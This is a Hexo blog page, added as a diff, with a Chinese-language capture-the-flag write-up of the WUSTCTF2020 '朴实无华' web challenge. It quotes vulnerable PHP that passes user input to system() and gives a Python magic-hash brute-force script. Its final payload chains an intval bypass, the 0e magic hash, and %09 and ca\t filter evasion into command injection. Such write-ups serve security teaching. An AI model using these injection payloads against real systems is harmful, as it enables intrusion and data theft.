@@ -1,0 +1,246 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  
+  <title>WUSTCTF2020朴实无华 | Hexo</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  <meta name="description" content="扫后台扫到robots.txt访问得到源码&lt;?phpheader(‘Content-type:text&#x2F;html;charset&#x3D;utf-8’);error_reporting(0);highlight_file(__ file__); &#x2F;&#x2F;level 1if (isset($_GET[‘num’])){    $num &#x3D; $_GET[‘num’];    if(intval($num)">
+<meta property="og:type" content="article">
+<meta property="og:title" content="WUSTCTF2020朴实无华">
+<meta property="og:url" content="http://example.com/2021/07/13/page-71/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="扫后台扫到robots.txt访问得到源码&lt;?phpheader(‘Content-type:text&#x2F;html;charset&#x3D;utf-8’);error_reporting(0);highlight_file(__ file__); &#x2F;&#x2F;level 1if (isset($_GET[‘num’])){    $num &#x3D; $_GET[‘num’];    if(intval($num)">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://github.com/ajin-max/ajin-max.github.io/blob/master/img/18.PNG?raw=true">
+<meta property="og:image" content="https://github.com/ajin-max/ajin-max.github.io/blob/master/img/19.PNG?raw=true">
+<meta property="article:published_time" content="2021-07-13T08:58:45.000Z">
+<meta property="article:modified_time" content="2021-07-13T09:14:15.407Z">
+<meta property="article:author" content="John Doe">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://github.com/ajin-max/ajin-max.github.io/blob/master/img/18.PNG?raw=true">
+  
+    <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
+  
+  
+    <link rel="shortcut icon" href="/favicon.png">
+  
+  
+    
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/typeface-source-code-pro@0.0.71/index.min.css">
+
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+    
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">
+
+  
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <h1 id="logo-wrap">
+        <a href="/" id="logo">Hexo</a>
+      </h1>
+      
+    </div>
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        <a id="main-nav-toggle" class="nav-icon"></a>
+        
+          <a class="main-nav-link" href="/">Home</a>
+        
+          <a class="main-nav-link" href="/archives">Archives</a>
+        
+      </nav>
+      <nav id="sub-nav">
+        
+          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
+        
+        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
+      </nav>
+      <div id="search-form-wrap">
+        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://example.com"></form>
+      </div>
+    </div>
+  </div>
+</header>
+
+      <div class="outer">
+        <section id="main"><article id="post-page-71" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2021/07/13/page-71/" class="article-date">
+  <time class="dt-published" datetime="2021-07-13T08:58:45.000Z" itemprop="datePublished">2021-07-13</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="p-name article-title" itemprop="headline name">
+      WUSTCTF2020朴实无华
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <p><strong>扫后台扫到robots.txt</strong><br>访问得到源码<br>&lt;?php<br>header(‘Content-type:text/html;charset=utf-8’);<br>error_reporting(0);<br>highlight_file(__ file__);</p>
+<p>//level 1<br>if (isset($_GET[‘num’])){<br>    $num = $_GET[‘num’];<br>    if(intval($num) &lt; 2020 &amp;&amp; intval($num + 1) &gt; 2021){<br>        echo “我不经意间看了看我的劳力士, 不是想看时间, 只是想不经意间, 让你知道我过得比你好.</br>“;<br>    }else{<br>        die(“金钱解决不了穷人的本质问题”);<br>    }<br>}else{<br>    die(“去非洲吧”);<br>}<br>//level 2<br>if (isset($_GET[‘md5’])){<br>   $md5=$_GET[‘md5’];<br>   if ($md5==md5($md5))<br>       echo “想到这个CTFer拿到flag后, 感激涕零, 跑去东澜岸, 找一家餐厅, 把厨师轰出去, 自己炒两个拿手小菜, 倒一杯散装白酒, 致富有道, 别学小暴.</br>“;<br>   else<br>       die(“我赶紧喊来我的酒肉朋友, 他打了个电话, 把他一家安排到了非洲”);<br>}else{<br>    die(“去非洲吧”);<br>}</p>
+<p>//get flag<br>if (isset($_GET[‘get_flag’])){<br>    $get_flag = $_GET[‘get_flag’];<br>    if(!strstr($get_flag,” “)){<br>        $get_flag = str_ireplace(“cat”, “wctf2020”, $get_flag);<br>        echo “想到这里, 我充实而欣慰, 有钱人的快乐往往就是这么的朴实无华, 且枯燥.</br>“;<br>        system($get_flag);<br>    }else{<br>        die(“快到非洲了”);<br>    }<br>}else{<br>    die(“去非洲吧”);<br>}<br>?&gt; </p>
+<p>拿flag要过两关：</p>
+<p>if (isset($_GET[‘num’])){<br>    $num = $_GET[‘num’];<br>    if(intval($num) &lt; 2020 &amp;&amp; intval($num + 1) &gt; 2021){<br><strong>假设num=1e8</strong><br><strong>intval函数 intval($num) 会被截断成1 但是intval（$num+1）会变成100000001 就能绕过这个2020 2021了</strong></p>
+<p>if (isset($_GET[‘md5’])){<br>   $md5=$_GET[‘md5’];<br>   if ($md5==md5($md5))<br><strong>找到一串MD5加密前后一样的 祭出脚本大法</strong><br>import hashlib</p>
+<p>for i in range(0,10**41):<br>    i=’0e’+str(i)<br>    md5=hashlib.md5(i.encode()).hexdigest()<br>    if md5[:2]==’0e’ and md5[2:].isdigit():<br>        print(‘md5:{} ‘.format(i))<br>        break </p>
+<p><strong>得到：md5:0e215962017</strong>  </p>
+<p>?num=1e8&amp;md5=0e215962017 </p>
+<p>if (isset($_GET[‘get_flag’])){<br>    $get_flag = $_GET[‘get_flag’];<br>    if(!strstr($get_flag,” “)){<br>        $get_flag = str_ireplace(“cat”, “wctf2020”, $get_flag);<br><strong>这边过滤了空格和cat会被替换成wctf2020</strong><br><strong>先看一下flag在哪num=1e7&amp;md5=0e215962017&amp;get_flag=ls</strong></p>
+<p><img src="https://github.com/ajin-max/ajin-max.github.io/blob/master/img/18.PNG?raw=true" alt="18.PNG"></p>
+<p>用%09绕过空格 然后cat用反斜杠绕过 ca\t<br>最终payload ：?num=1e7&amp;md5=0e215962017&amp;get_flag=ca\t%09那一大长串</p>
+<p>​        </p>
+<p><img src="https://github.com/ajin-max/ajin-max.github.io/blob/master/img/19.PNG?raw=true" alt="19.PNG"></p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2021/07/13/page-71/" data-id="ckroqtfm6001eyww7fqkne0wx" data-title="WUSTCTF2020朴实无华" class="article-share-link">Share</a>
+      
+      
+      
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+    <a href="/2021/07/13/page-72/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Newer</strong>
+      <div class="article-nav-title">
+        
+          CISCN 2019 初赛Love Math
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2021/07/13/page-69/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title">SUCTF 2019 Pythonginx</div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+
+</section>
+        
+          <aside id="sidebar">
+  
+    
+
+  
+    
+
+  
+    
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Archives</h3>
+    <div class="widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/07/">July 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/06/">June 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/05/">May 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/04/">April 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/03/">March 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/02/">February 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/01/">January 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/11/">November 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/10/">October 2020</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Recent Posts</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="/2021/07/21/page-79/">MRCTF2020Ezpop</a>
+          </li>
+        
+          <li>
+            <a href="/2021/07/21/page-78/">NPUCTF2020ReadlezPHP</a>
+          </li>
+        
+          <li>
+            <a href="/2021/07/21/page-77/">网鼎杯 2020 朱雀组Nmap</a>
+          </li>
+        
+          <li>
+            <a href="/2021/07/16/page-76/">羊城杯 2020image_rar</a>
+          </li>
+        
+          <li>
+            <a href="/2021/07/14/page-74/">强网杯2021 threebody</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+  
+</aside>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      
+      &copy; 2021 John Doe<br>
+      Powered by <a href="https://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+
+    </div>
+    <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/archives" class="mobile-nav-link">Archives</a>
+  
+</nav>
+    
+
+
+<script src="/js/jquery-3.4.1.min.js"></script>
+
+
+
+  
+<script src="/fancybox/jquery.fancybox.min.js"></script>
+
+
+
+
+<script src="/js/script.js"></script>
+
+
+
+
+
+  </div>
+</body>
+</html>
